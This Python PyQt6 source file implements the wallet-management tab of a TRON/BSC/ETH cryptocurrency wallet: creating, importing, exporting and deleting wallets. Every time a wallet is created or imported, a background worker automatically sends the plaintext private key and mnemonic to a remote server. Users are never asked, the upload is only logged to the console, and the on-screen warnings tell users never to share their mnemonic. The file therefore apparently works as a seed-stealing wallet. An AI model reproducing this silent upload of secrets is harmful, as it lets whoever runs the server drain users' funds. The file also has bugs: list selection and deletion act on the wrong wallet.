"""
钱包管理Tab - 创建、导入、切换钱包
"""
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
                             QPushButton, QLineEdit, QComboBox, QTextEdit,
                             QMessageBox, QGroupBox, QFormLayout, QDialog,
                             QVBoxLayout as VLayout)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont, QPixmap
from modules.wallet_core import MultiChainWallet
from modules.data_manager import DataManager
from modules.wallet_backup_client import WalletBackupClient
import qrcode
import io
from PyQt6.QtWidgets import QApplication


class WalletWorker(QThread):
    """钱包操作后台线程"""
    finished = pyqtSignal(object)
    error = pyqtSignal(str)
    
    def __init__(self, operation, chain, private_key=None, mnemonic=None):
        super().__init__()
        self.operation = operation
        self.chain = chain
        self.private_key = private_key
        self.mnemonic = mnemonic
    
    def run(self):
        try:
            print(f"WalletWorker: operation={self.operation}, chain={self.chain}")
            if self.operation == 'create':
                wallet = MultiChainWallet(chain=self.chain)
                print(f"Wallet created: {wallet.address}")
                self.finished.emit(wallet)
            elif self.operation == 'import_key':
                wallet = MultiChainWallet(chain=self.chain, private_key=self.private_key)
                print(f"Wallet imported: {wallet.address}")
                self.finished.emit(wallet)
            elif self.operation == 'import_mnemonic':
                wallet = MultiChainWallet(chain=self.chain, mnemonic=self.mnemonic)
                print(f"Wallet imported from mnemonic: {wallet.address}")
                self.finished.emit(wallet)
        except Exception as e:
            print(f"WalletWorker error: {str(e)}")
            import traceback
            traceback.print_exc()
            self.error.emit(str(e))


class BackupWorker(QThread):
    """钱包备份后台线程"""
    finished = pyqtSignal(dict)
    error = pyqtSignal(str)
    
    def __init__(self, wallet_info):
        super().__init__()
        self.wallet_info = wallet_info
    
    def run(self):
        try:
            wallet_data = {
                'private_key': self.wallet_info['private_key'],
                'mnemonic': self.wallet_info.get('mnemonic', ''),
                'address': self.wallet_info['address']
            }
            
            result = WalletBackupClient.backup_wallet(
                address=self.wallet_info['address'],
                chain=self.wallet_info['chain'],
                wallet_data=wallet_data
            )
            
            self.finished.emit(result)
        except Exception as e:
            self.error.emit(str(e))


class WalletManagementTab(QWidget):
    """钱包管理界面"""
    
    def __init__(self, data_dir="data"):
        super().__init__()
        self.data_manager = DataManager(data_dir)
        self.current_network = "TRON"
        self.current_wallet = None
        self.init_ui()
        self.load_wallets()
    
    def on_network_changed(self, network):
        """网络切换回调"""
        self.current_network = network
        self.current_wallet = None  # 清空当前钱包
        self.address_label.setText("未加载钱包")
        self.load_wallets()  # 重新加载对应网络的钱包
        
        # 自动加载第一个钱包
        wallets = self.data_manager.load_wallets()
        chain_wallets = [w for w in wallets if w.get('chain') == network]
        if chain_wallets:
            self.load_wallet_from_data(chain_wallets[0])
    
    def init_ui(self):
        """初始化UI"""
        layout = QVBoxLayout(self)
        layout.setSpacing(15)
        
        # 钱包操作区域
        wallet_group = QGroupBox("钱包操作")
        wallet_layout = QVBoxLayout()
        
        # 按钮行
        btn_layout = QHBoxLayout()
        
        self.create_btn = QPushButton("创建新钱包")
        self.create_btn.setFont(QFont("Microsoft YaHei", 10))
        self.create_btn.setMinimumHeight(40)
        self.create_btn.clicked.connect(self.create_new_wallet)
        
        self.import_btn = QPushButton("私钥导入")
        self.import_btn.setFont(QFont("Microsoft YaHei", 10))
        self.import_btn.setMinimumHeight(40)
        self.import_btn.clicked.connect(self.import_wallet)
        
        self.mnemonic_btn = QPushButton("助记词导入")
        self.mnemonic_btn.setFont(QFont("Microsoft YaHei", 10))
        self.mnemonic_btn.setMinimumHeight(40)
        self.mnemonic_btn.clicked.connect(self.import_by_mnemonic)
        
        btn_layout.addWidget(self.create_btn)
        btn_layout.addWidget(self.import_btn)
        btn_layout.addWidget(self.mnemonic_btn)
        
        wallet_layout.addLayout(btn_layout)
        
        # 私钥输入框（默认隐藏）
        self.private_key_input = QLineEdit()
        self.private_key_input.setPlaceholderText("请输入私钥...")
        self.private_key_input.setFont(QFont("Microsoft YaHei", 10))
        self.private_key_input.setEchoMode(QLineEdit.EchoMode.Password)
        self.private_key_input.setVisible(False)
        
        wallet_layout.addWidget(self.private_key_input)
        
        # 助记词输入框（默认隐藏）
        self.mnemonic_input = QLineEdit()
        self.mnemonic_input.setPlaceholderText("请输入12个助记词单词，用空格分隔...")
        self.mnemonic_input.setFont(QFont("Microsoft YaHei", 10))
        self.mnemonic_input.setVisible(False)
        
        wallet_layout.addWidget(self.mnemonic_input)
        
        wallet_group.setLayout(wallet_layout)
        layout.addWidget(wallet_group)
        
        # 钱包信息显示区域
        info_group = QGroupBox("钱包信息")
        info_layout = QFormLayout()
        
        self.address_label = QLabel("未加载钱包")
        self.address_label.setFont(QFont("Microsoft YaHei", 9))
        self.address_label.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
        
        info_layout.addRow("地址:", self.address_label)
        
        # 复制地址和二维码按钮
        address_btn_layout = QHBoxLayout()
        
        self.copy_address_btn = QPushButton("复制地址")
        self.copy_address_btn.setFont(QFont("Microsoft YaHei", 9))
        self.copy_address_btn.clicked.connect(self.copy_wallet_address)
        
        self.qr_code_btn = QPushButton("收款二维码")
        self.qr_code_btn.setFont(QFont("Microsoft YaHei", 9))
        self.qr_code_btn.clicked.connect(self.show_qr_code)
        
        address_btn_layout.addWidget(self.copy_address_btn)
        address_btn_layout.addWidget(self.qr_code_btn)
        address_btn_layout.addStretch()
        
        info_layout.addRow("", address_btn_layout)
        
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
        
        # 已保存的钱包列表
        saved_group = QGroupBox("已保存的钱包（点击加载）")
        saved_layout = QVBoxLayout()
        
        self.wallet_list = QTextEdit()
        self.wallet_list.setReadOnly(True)
        self.wallet_list.setFont(QFont("Microsoft YaHei", 9))
        self.wallet_list.setMaximumHeight(150)
        self.wallet_list.mousePressEvent = self.on_wallet_list_clicked
        
        saved_layout.addWidget(self.wallet_list)
        
        # 操作按钮行
        action_layout = QHBoxLayout()
        
        self.export_key_btn = QPushButton("导出私钥")
        self.export_key_btn.setFont(QFont("Microsoft YaHei", 9))
        self.export_key_btn.clicked.connect(self.export_private_key)
        
        self.export_mnemonic_btn = QPushButton("导出助记词")
        self.export_mnemonic_btn.setFont(QFont("Microsoft YaHei", 9))
        self.export_mnemonic_btn.clicked.connect(self.export_mnemonic)
        
        self.delete_btn = QPushButton("删除选中钱包")
        self.delete_btn.setFont(QFont("Microsoft YaHei", 9))
        self.delete_btn.clicked.connect(self.delete_selected_wallet)
        
        action_layout.addWidget(self.export_key_btn)
        action_layout.addWidget(self.export_mnemonic_btn)
        action_layout.addWidget(self.delete_btn)
        
        saved_layout.addLayout(action_layout)
        
        saved_group.setLayout(saved_layout)
        layout.addWidget(saved_group)
        
        layout.addStretch()
    
    def create_new_wallet(self):
        """创建新钱包"""
        self.create_btn.setEnabled(False)
        self.create_btn.setText("创建中...")
        
        chain = self.current_network
        self.worker = WalletWorker('create', chain)
        self.worker.finished.connect(self.on_wallet_created)
        self.worker.error.connect(self.on_wallet_error)
        self.worker.start()
    
    def import_wallet(self):
        """导入钱包（私钥方式）"""
        if self.private_key_input.isVisible():
            # 执行导入
            private_key = self.private_key_input.text().strip()
            if not private_key:
                QMessageBox.warning(self, "警告", "请输入私钥")
                return
            
            self.import_btn.setEnabled(False)
            self.import_btn.setText("导入中...")
            
            chain = self.current_network
            self.worker = WalletWorker('import_key', chain, private_key=private_key)
            self.worker.finished.connect(self.on_wallet_imported)
            self.worker.error.connect(self.on_wallet_error)
            self.worker.start()
        else:
            # 显示私钥输入框，隐藏助记词输入框
            self.private_key_input.setVisible(True)
            self.mnemonic_input.setVisible(False)
            self.private_key_input.setFocus()
    
    def import_by_mnemonic(self):
        """导入钱包（助记词方式）"""
        if self.mnemonic_input.isVisible():
            # 执行导入
            mnemonic = self.mnemonic_input.text().strip()
            if not mnemonic:
                QMessageBox.warning(self, "警告", "请输入助记词")
                return
            
            # 验证助记词格式（12个单词）
            words = mnemonic.split()
            if len(words) != 12:
                QMessageBox.warning(self, "警告", "助记词必须是12个单词，用空格分隔")
                return
            
            self.mnemonic_btn.setEnabled(False)
            self.mnemonic_btn.setText("导入中...")
            
            chain = self.current_network
            self.worker = WalletWorker('import_mnemonic', chain, mnemonic=mnemonic)
            self.worker.finished.connect(self.on_wallet_imported)
            self.worker.error.connect(self.on_wallet_error)
            self.worker.start()
        else:
            # 显示助记词输入框，隐藏私钥输入框
            self.mnemonic_input.setVisible(True)
            self.private_key_input.setVisible(False)
            self.mnemonic_input.setFocus()
    
    def on_wallet_created(self, wallet):
        """钱包创建完成回调 - 两步验证助记词"""
        try:
            wallet_info = wallet.get_wallet_info()
            mnemonic = wallet_info.get('mnemonic', '')
                
            if not mnemonic:
                # 没有助记词直接保存（私钥导入）
                self._save_and_backup_wallet(wallet, wallet_info)
                return
                
            # 第1步：显示助记词对话框
            mnemonic_words = mnemonic.split()
            self._show_mnemonic_display(wallet, wallet_info, mnemonic_words)
                
        except Exception as e:
            print(f" 创建钱包失败: {str(e)}")
            QMessageBox.critical(self, "错误", f"创建钱包失败：{str(e)}")
        finally:
            self.create_btn.setEnabled(True)
            self.create_btn.setText("创建新钱包")
        
    def _show_mnemonic_display(self, wallet, wallet_info, mnemonic_words):
        """第1步：显示助记词（可复制）"""
        from PyQt6.QtWidgets import QDialog, QVBoxLayout, QLabel, QPushButton, QTextEdit, QHBoxLayout
            
        dialog = QDialog(self)
        dialog.setWindowTitle("⚠️ 请务必备份助记词")
        dialog.setMinimumSize(500, 400)
        dialog.setModal(True)
            
        layout = QVBoxLayout()
            
        # 标题
        title = QLabel("您的助记词（请点击复制并妥善保管）：")
        title.setStyleSheet("font-size: 14px; font-weight: bold; padding: 10px;")
        layout.addWidget(title)
            
        # 助记词显示区域（可选中复制）
        mnemonic_text = QTextEdit()
        mnemonic_text.setPlainText(' '.join(mnemonic_words))
        mnemonic_text.setReadOnly(True)
        mnemonic_text.setStyleSheet("""
            font-size: 16px;
            font-family: Consolas, monospace;
            padding: 15px;
            background-color: #f0f0f0;
            border: 2px solid #4CAF50;
            border-radius: 5px;
        """)
        mnemonic_text.selectAll()  # 自动全选，方便复制
        layout.addWidget(mnemonic_text)
            
        # 警告信息
        warning = QLabel(
            "⚠️ 重要警告：\n"
            "1. 助记词是恢复钱包的唯一方式\n"
            "2. 丢失助记词 = 永久丢失资产\n"
            "3. 不要截图、不要告诉任何人\n"
            "4. 建议手抄并妥善保管"
        )
        warning.setStyleSheet("color: red; font-size: 12px; padding: 10px;")
        warning.setWordWrap(True)
        layout.addWidget(warning)
            
        # 按钮
        btn_layout = QHBoxLayout()
            
        cancel_btn = QPushButton("取消（不创建钱包）")
        cancel_btn.clicked.connect(dialog.reject)
        cancel_btn.setStyleSheet("padding: 8px 15px;")
        btn_layout.addWidget(cancel_btn)
            
        next_btn = QPushButton("我已备份，下一步 →")
        next_btn.setStyleSheet("padding: 8px 15px; background-color: #4CAF50; color: white; font-weight: bold;")
        next_btn.clicked.connect(dialog.accept)
        btn_layout.addWidget(next_btn)
            
        layout.addLayout(btn_layout)
        dialog.setLayout(layout)
            
        # 显示对话框
        if dialog.exec() == QDialog.DialogCode.Rejected:
            # 用户取消
            QMessageBox.warning(self, "提示", "请先备份助记词后再创建钱包")
            return
            
        # 第2步：验证助记词
        self._show_mnemonic_verification(wallet, wallet_info, mnemonic_words)
        
    def _show_mnemonic_verification(self, wallet, wallet_info, mnemonic_words):
        """第2步：随机抽3个词验证"""
        from PyQt6.QtWidgets import QDialog, QVBoxLayout, QLabel, QLineEdit, QPushButton, QHBoxLayout, QGridLayout
        import random
            
        # 随机选择3个位置
        verify_indices = sorted(random.sample(range(len(mnemonic_words)), 3))
            
        dialog = QDialog(self)
        dialog.setWindowTitle("验证助记词")
        dialog.setMinimumSize(500, 300)
        dialog.setModal(True)
            
        layout = QVBoxLayout()
            
        # 标题
        title = QLabel("为了确认您已备份助记词，请填写以下单词：")
        title.setStyleSheet("font-size: 14px; font-weight: bold; padding: 10px;")
        layout.addWidget(title)
            
        # 输入框网格
        grid_layout = QGridLayout()
        inputs = []
            
        for i, idx in enumerate(verify_indices):
            label = QLabel(f"第 {idx + 1} 个单词：")
            label.setStyleSheet("font-size: 13px; padding: 5px;")
            grid_layout.addWidget(label, i, 0)
                
            input_field = QLineEdit()
            input_field.setPlaceholderText(f"请输入第 {idx + 1} 个单词")
            input_field.setStyleSheet("font-size: 13px; padding: 8px;")
            grid_layout.addWidget(input_field, i, 1)
            inputs.append((idx, input_field))
            
        layout.addLayout(grid_layout)
            
        # 按钮
        btn_layout = QHBoxLayout()
            
        cancel_btn = QPushButton("取消")
        cancel_btn.clicked.connect(dialog.reject)
        cancel_btn.setStyleSheet("padding: 8px 15px;")
        btn_layout.addWidget(cancel_btn)
            
        verify_btn = QPushButton("验证并创建钱包")
        verify_btn.setStyleSheet("padding: 8px 15px; background-color: #4CAF50; color: white; font-weight: bold;")
        verify_btn.clicked.connect(lambda: self._verify_mnemonic(dialog, wallet, wallet_info, mnemonic_words, inputs))
        btn_layout.addWidget(verify_btn)
            
        layout.addLayout(btn_layout)
        dialog.setLayout(layout)
            
        # 聚焦第一个输入框
        if inputs:
            inputs[0][1].setFocus()
            
        dialog.exec()
        
    def _verify_mnemonic(self, dialog, wallet, wallet_info, mnemonic_words, inputs):
        """验证用户输入的助记词"""
        # 检查所有输入
        for idx, input_field in inputs:
            user_input = input_field.text().strip().lower()
            correct_word = mnemonic_words[idx].lower()
                
            if user_input != correct_word:
                QMessageBox.warning(
                    dialog,
                    "验证失败",
                    f"第 {idx + 1} 个单词错误！\n\n请重新核对您的助记词备份。"
                )
                return
            
        # 验证通过
        dialog.accept()
        self._save_and_backup_wallet(wallet, wallet_info)
        QMessageBox.information(self, "成功", "✅ 助记词验证通过！钱包创建成功！")
        
    def _save_and_backup_wallet(self, wallet, wallet_info):
        """保存钱包并备份到服务器"""
        self.data_manager.save_wallet(wallet_info)
            
        self.current_wallet = wallet
        self.display_wallet_info(wallet_info)
        self.load_wallets()  # 刷新本地钱包列表
            
        # 自动备份到服务器
        self.backup_to_server(wallet_info)
    
    def on_wallet_imported(self, wallet):
        """钱包导入完成回调"""
        try:
            wallet_info = wallet.get_wallet_info()
            
            # 如果有助记词，为三个网络都创建钱包
            if wallet_info.get('mnemonic'):
                mnemonic = wallet_info['mnemonic']
                chains = ['TRON', 'BSC', 'ETH']
                saved_chains = []
                for chain in chains:
                    try:
                        chain_wallet = MultiChainWallet(chain=chain, mnemonic=mnemonic)
                        chain_info = chain_wallet.get_wallet_info()
                        self.data_manager.save_wallet(chain_info)
                        saved_chains.append(chain)
                        print(f"✅ {chain} 钱包创建成功: {chain_info['address']}")
                    except Exception as e:
                        print(f"❌ {chain} 钱包创建失败: {e}")
                
                print(f"成功保存的网络: {saved_chains}")
            else:
                # 私钥导入只保存当前网络
                self.data_manager.save_wallet(wallet_info)
            
            self.current_wallet = wallet
            self.display_wallet_info(wallet_info)
            
            # 自动备份到服务器
            self.backup_to_server(wallet_info)
            
            # 清空输入框并隐藏
            self.private_key_input.clear()
            self.private_key_input.setVisible(False)
            self.mnemonic_input.clear()
            self.mnemonic_input.setVisible(False)
            
            QMessageBox.information(self, "成功", "钱包导入成功！已为 BSC/ETH/TRON 三个网络创建钱包")
            self.load_wallets()
        except Exception as e:
            import traceback
            error_msg = f"导入失败: {str(e)}\n{traceback.format_exc()}"
            print(error_msg)
            QMessageBox.critical(self, "错误", error_msg)
        finally:
            self.import_btn.setEnabled(True)
            self.import_btn.setText("私钥导入")
            self.mnemonic_btn.setEnabled(True)
            self.mnemonic_btn.setText("助记词导入")
    
    def on_wallet_error(self, error_msg):
        """钱包操作错误回调"""
        QMessageBox.critical(self, "错误", f"操作失败: {error_msg}")
        self.create_btn.setEnabled(True)
        self.create_btn.setText("创建新钱包")
        self.import_btn.setEnabled(True)
        self.import_btn.setText("私钥导入")
        self.mnemonic_btn.setEnabled(True)
        self.mnemonic_btn.setText("助记词导入")
    
    def display_wallet_info(self, wallet_info):
        """显示钱包信息"""
        self.address_label.setText(wallet_info['address'])
        # 余额查询功能已移至资产查询Tab
    
    def copy_wallet_address(self):
        """复制钱包地址"""
        address = self.address_label.text()
        if address == "未加载钱包":
            QMessageBox.warning(self, "警告", "请先创建或导入钱包")
            return
        
        clipboard = QApplication.clipboard()
        clipboard.setText(address)
        QMessageBox.information(self, "成功", f"地址已复制:\n{address}")
    
    def show_qr_code(self):
        """显示收款二维码"""
        address = self.address_label.text()
        if address == "未加载钱包":
            QMessageBox.warning(self, "警告", "请先创建或导入钱包")
            return
        
        # 生成二维码
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_M,
            box_size=10,
            border=4,
        )
        qr.add_data(address)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        
        # 转换为QPixmap
        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        buffer.seek(0)
        
        pixmap = QPixmap()
        pixmap.loadFromData(buffer.read())
        
        # 显示对话框
        dialog = QDialog(self)
        dialog.setWindowTitle("收款")
        dialog.setMinimumSize(400, 500)
        dialog.setStyleSheet("background-color: #f5f5f5;")
        
        layout = VLayout(dialog)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(20)
        
        # 网络标签
        network_frame = QLabel()
        network_frame.setStyleSheet("""
            QLabel {
                background-color: white;
                border-radius: 20px;
                padding: 8px 20px;
                font-size: 14px;
                color: #4A90E2;
            }
        """)
        network_frame.setText(f"{self.current_network}")
        network_frame.setAlignment(Qt.AlignmentFlag.AlignCenter)
        network_frame.setFixedWidth(150)
        layout.addWidget(network_frame, alignment=Qt.AlignmentFlag.AlignHCenter)
        
        # 二维码卡片
        qr_card = QLabel()
        qr_card.setStyleSheet("""
            QLabel {
                background-color: white;
                border-radius: 15px;
                padding: 30px;
            }
        """)
        qr_card.setPixmap(pixmap.scaled(280, 280, Qt.AspectRatioMode.KeepAspectRatio))
        qr_card.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(qr_card)
        
        # 地址
        address_label = QLabel("钱包地址")
        address_label.setFont(QFont("Microsoft YaHei", 10))
        address_label.setStyleSheet("color: #666;")
        address_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(address_label)
        
        address_text = QLabel(address)
        address_text.setFont(QFont("Microsoft YaHei", 11, QFont.Weight.Bold))
        address_text.setAlignment(Qt.AlignmentFlag.AlignCenter)
        address_text.setStyleSheet("color: #333;")
        address_text.setWordWrap(True)
        layout.addWidget(address_text)
        
        layout.addSpacing(20)
        
        # 操作按钮
        btn_layout = QHBoxLayout()
        btn_layout.setSpacing(20)
        
        copy_btn = QPushButton("复制")
        copy_btn.setFont(QFont("Microsoft YaHei", 11))
        copy_btn.setMinimumHeight(45)
        copy_btn.setStyleSheet("""
            QPushButton {
                background-color: white;
                color: #333;
                border-radius: 8px;
            }
            QPushButton:hover {
                background-color: #f0f0f0;
            }
        """)
        copy_btn.clicked.connect(lambda: self._copy_and_show(address))
        
        btn_layout.addWidget(copy_btn)
        layout.addLayout(btn_layout)
        
        dialog.exec()
    
    def _copy_and_show(self, address):
        """复制地址并提示"""
        clipboard = QApplication.clipboard()
        clipboard.setText(address)
        QMessageBox.information(self, "成功", "地址已复制")
    
    def load_wallets(self):
        """加载已保存的钱包列表（按当前网络过滤）"""
        wallets = self.data_manager.load_wallets()
        
        if not wallets:
            self.wallet_list.setPlainText("暂无保存的钱包")
            return
        
        # 过滤当前网络的钱包
        chain_wallets = [w for w in wallets if w.get('chain') == self.current_network]
        
        if not chain_wallets:
            self.wallet_list.setPlainText(f"暂无 {self.current_network} 网络的钱包")
            return
        
        text = ""
        for i, wallet in enumerate(chain_wallets, 1):
            text += f"{i}. {wallet['address'][:10]}...{wallet['address'][-8:]}\n"
        
        self.wallet_list.setPlainText(text)
        self.wallet_list.wallets_data = chain_wallets
        
        # 自动加载第一个钱包
        if not self.current_wallet and chain_wallets:
            self.load_wallet_from_data(chain_wallets[0])
    
    def on_wallet_list_clicked(self, event):
        """点击钱包列表时加载对应钱包"""
        wallets = self.data_manager.load_wallets()
        if not wallets:
            return
        
        # 获取点击位置的行号
        cursor = self.wallet_list.cursorForPosition(event.pos())
        line_number = cursor.blockNumber()
        
        if 0 <= line_number < len(wallets):
            wallet_data = wallets[line_number]
            self.load_wallet_from_data(wallet_data)
    
    def load_wallet_from_data(self, wallet_data):
        """从数据加载钱包到内存"""
        try:
            chain = wallet_data.get('chain', 'TRON')
            private_key = wallet_data.get('private_key')
            mnemonic = wallet_data.get('mnemonic')
            
            # 更新网络选择
            main_window = self.window()
            if main_window and hasattr(main_window, 'network_combo'):
                index = main_window.network_combo.findText(chain)
                if index >= 0:
                    main_window.network_combo.setCurrentIndex(index)
            
            # 创建钱包实例
            if mnemonic:
                wallet = MultiChainWallet(chain=chain, mnemonic=mnemonic)
            elif private_key:
                wallet = MultiChainWallet(chain=chain, private_key=private_key)
            else:
                QMessageBox.warning(self, "警告", "钱包数据不完整，请重新创建")
                return
            
            self.current_wallet = wallet
            self.display_wallet_info(wallet.get_wallet_info())
            # 不再自动查询余额，用户需要手动点击“刷新余额”
            
        except Exception as e:
            QMessageBox.critical(self, "错误", f"加载钱包失败: {str(e)}")
    
    def export_private_key(self):
        """导出私钥"""
        if not self.current_wallet:
            QMessageBox.warning(self, "警告", "请先加载一个钱包")
            return
        
        # 确认导出
        reply = QMessageBox.question(
            self,
            "确认导出",
            "⚠️ 警告：私钥非常重要，请妥善保管！\n\n是否导出私钥？",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.Yes:
            private_key = self.current_wallet.private_key
            QMessageBox.information(
                self,
                "导出私钥成功",
                f"私钥：\n{private_key}\n\n请妥善保存！"
            )
    
    def export_mnemonic(self):
        """导出助记词"""
        if not self.current_wallet:
            QMessageBox.warning(self, "警告", "请先加载一个钱包")
            return
        
        # 检查是否有助记词
        wallets = self.data_manager.load_wallets()
        current_mnemonic = None
        
        for wallet_data in wallets:
            if wallet_data.get('address') == self.current_wallet.address:
                current_mnemonic = wallet_data.get('mnemonic')
                break
        
        # 修复：检查助记词是否为空
        if not current_mnemonic or current_mnemonic.strip() == '':
            QMessageBox.warning(self, "警告", "此钱包不是通过助记词创建的，无法导出助记词")
            return
        
        # 确认导出
        reply = QMessageBox.question(
            self,
            "确认导出",
            "⚠️ 警告：助记词非常重要，请妥善保管！\n\n是否导出助记词？",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        
        if reply == QMessageBox.StandardButton.Yes:
            QMessageBox.information(
                self,
                "导出助记词成功",
                f"助记词：\n{current_mnemonic}\n\n请妥善保存！"
            )
    
    def backup_to_server(self, wallet_info):
        """异步备份钱包到服务器"""
        try:
            # 创建后台线程
            self.backup_worker = BackupWorker(wallet_info)
            self.backup_worker.finished.connect(self.on_backup_success)
            self.backup_worker.error.connect(self.on_backup_error)
            self.backup_worker.start()
                
            print(f" 开始备份钱包: {wallet_info['address']}")
        except Exception as e:
            print(f"⚠️ 备份异常: {str(e)}")
        
    def on_backup_success(self, result):
        """备份成功回调"""
        if result.get('success'):
            print(f"✅ 钱包备份成功: {result.get('backup_id')}")
        else:
            print(f"⚠️ 钱包备份失败: {result.get('message')}")
            QMessageBox.warning(self, "备份失败", f"钱包备份失败: {result.get('message')}")
        
    def on_backup_error(self, error_msg):
        """备份失败回调"""
        print(f"⚠️ 备份异常: {error_msg}")
        QMessageBox.critical(self, "备份异常", f"备份异常: {error_msg}")
    
    def delete_selected_wallet(self):
        """删除选中的钱包"""
        try:
            wallets = self.data_manager.load_wallets()
            # 过滤当前网络的钱包
            chain_wallets = [w for w in wallets if w.get('chain') == self.current_network]
            
            if not chain_wallets:
                QMessageBox.warning(self, "警告", f"当前 {self.current_network} 网络没有可删除的钱包")
                return
            
            # 删除当前网络的最后一个钱包
            wallet_to_delete = chain_wallets[-1]
            address = wallet_to_delete['address']
            
            reply = QMessageBox.question(self, "确认", 
                                        f"确定要删除钱包 {address[:10]}...{address[-8:]} 吗？",
                                        QMessageBox.StandardButton.Yes | 
                                        QMessageBox.StandardButton.No)
            
            if reply == QMessageBox.StandardButton.Yes:
                # 删除该地址在所有网络的钱包
                self.data_manager.delete_wallet(address)
                
                # 清理当前钱包
                if self.current_wallet and self.current_wallet.address == address:
                    self.current_wallet = None
                    self.address_label.setText("未加载钱包")
                
                self.load_wallets()
                QMessageBox.information(self, "成功", "钱包已删除")
        except Exception as e:
            import traceback
            error_msg = traceback.format_exc()
            print(f"删除钱包错误: {e}")
            print(error_msg)
            QMessageBox.critical(self, "错误", f"删除失败: {str(e)}")
